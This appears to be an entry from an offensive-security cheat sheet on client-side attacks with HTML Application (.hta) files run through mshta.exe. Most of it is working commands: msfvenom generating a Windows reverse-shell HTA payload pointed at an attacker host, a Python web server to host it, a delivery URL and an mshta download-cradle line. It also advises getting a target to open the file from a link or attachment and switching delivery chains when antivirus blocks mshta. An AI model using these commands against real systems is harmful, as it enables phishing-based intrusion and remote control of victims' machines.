title: Client-Side — HTA
body: An HTA is a single HTML Application that runs via mshta.exe with full local privileges of the user. One file, no Office. Good when you can get the target to open an .hta from a link or attachment.
cmd:
# Generate HTA reverse shell
msfvenom -p windows/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f hta-psh -o shell.hta
python3 -m http.server 80
# Deliver: http://$lhost/shell.hta  (runs via mshta.exe on click)

# Or a download-cradle HTA body calling your PS payload:
#   mshta.exe http://$lhost/shell.hta
warn: mshta is increasingly flagged/restricted by AV and app-control. If it dies, fall back to the library+lnk chain or macro_pack-generated formats.
